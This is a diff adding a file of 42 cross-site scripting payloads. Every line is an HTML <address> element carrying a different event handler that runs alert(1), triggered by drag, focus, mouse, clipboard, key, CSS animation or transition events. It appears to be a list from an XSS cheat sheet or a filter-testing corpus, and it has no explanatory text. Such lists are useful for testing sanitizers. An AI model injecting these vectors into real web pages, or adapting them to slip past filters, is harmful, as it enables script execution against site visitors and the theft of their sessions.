@@ -1,0 +1,42 @@
+<address draggable="true" ondrag="alert(1)">test</address>
+<address draggable="true" ondragend="alert(1)">test</address>
+<address draggable="true" ondragenter="alert(1)">test</address>
+<address draggable="true" ondragleave="alert(1)">test</address>
+<address draggable="true" ondragstart="alert(1)">test</address>
+<address id=x tabindex=1 onactivate=alert(1)></address>
+<address id=x tabindex=1 onbeforeactivate=alert(1)></address>
+<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>
+<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>
+<address id=x tabindex=1 onfocus=alert(1)></address>
+<address id=x tabindex=1 onfocusin=alert(1)></address>
+<address onbeforecopy="alert(1)" contenteditable>test</address>
+<address onbeforecut="alert(1)" contenteditable>test</address>
+<address onbeforepaste="alert(1)" contenteditable>test</address>
+<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>
+<address onclick="alert(1)">test</address>
+<address oncontextmenu="alert(1)">test</address>
+<address oncopy="alert(1)" contenteditable>test</address>
+<address oncut="alert(1)" contenteditable>test</address>
+<address ondblclick="alert(1)">test</address>
+<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>
+<address onkeydown="alert(1)" contenteditable>test</address>
+<address onkeypress="alert(1)" contenteditable>test</address>
+<address onkeyup="alert(1)" contenteditable>test</address>
+<address onmousedown="alert(1)">test</address>
+<address onmouseenter="alert(1)">test</address>
+<address onmouseleave="alert(1)">test</address>
+<address onmousemove="alert(1)">test</address>
+<address onmouseout="alert(1)">test</address>
+<address onmouseover="alert(1)">test</address>
+<address onmouseup="alert(1)">test</address>
+<address onpaste="alert(1)" contenteditable>test</address>
+<div draggable="true" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>
+<div draggable="true" contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address>
+<style>:target {color: red;}</style><address id=x style="transition:color 10s" ontransitioncancel=alert(1)></address>
+<style>:target {color:red;}</style><address id=x style="transition:color 1s" ontransitionend=alert(1)></address>
+<style>:target {transform: rotate(180deg);}</style><address id=x style="transition:transform 2s" ontransitionrun=alert(1)></address>
+<style>@keyframes slidein {}</style><address style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></address>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><address id=x style="position:absolute;" onanimationcancel="alert(1)"></address>
+<style>@keyframes x{}</style><address style="animation-name:x" onanimationend="alert(1)"></address>
+<style>@keyframes x{}</style><address style="animation-name:x" onanimationstart="alert(1)"></address>
+<svg><address onload=alert(1)></address>
